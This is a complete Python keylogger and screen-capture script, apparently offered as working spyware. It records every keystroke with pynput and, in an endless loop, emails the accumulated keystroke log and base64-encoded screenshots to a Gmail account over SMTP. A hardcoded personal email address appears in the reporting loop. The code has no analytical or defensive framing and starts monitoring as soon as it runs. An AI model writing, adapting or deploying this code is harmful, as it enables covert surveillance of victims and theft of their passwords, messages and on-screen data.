import smtplib
import PIL.ImageGrab
from pynput import keyboard
from pynput.keyboard import Listener
import time
import io
import base64

class Bane():
   def __init__(self, email, password):
      self.log = ""
      self.email = email
      self.password = password
      
   def appendlog(self, string):
       self.log += string

   
   def save_data(self, key):
       try:
           data = str(key.char)
       except AttributeError:
          if key == key.space:
                data = " "
          elif key == key.shift:
                data = ""
          elif key == key.alt_l:
                data = ""
          elif key == key.alt_r:
                 data = ""
          elif key == key.ctrl_l:
                 data = ""
          elif key == key.ctrl_r:
                 data = ""    
          else:     
               data = " " + str(key) + " "
           


         
       self.appendlog(data)
       
   def sendmail(self, email, password, message):
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message.encode('utf-8'))
        server.quit()

        
  
                      




 
      
   def report(self):
        while True:
                   time.sleep(10)
                   self.sendmail(self.email, self.password, "\n\n" + self.log)
                   time.sleep(20)
                   buffer = io.BytesIO()
                   im=PIL.ImageGrab.grab()
                   im.save(buffer, format='JPEG')
                   b64_str = base64.b64encode(buffer.getvalue())
                   s = smtplib.SMTP('smtp.gmail.com', 587)
                   s.starttls()
                   email = "d.rzeczowe@gmail.com"
                   s.login(email, password)
                   message = b64_str
                   s.sendmail(self.email, self.email , message)
 

   def run(self):
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        with keyboard_listener:
             self.report()
             keyboard_listener.join()
             
   
email_address = ""
password = ""



crit2 = Bane(email_address, password)
crit2.run()
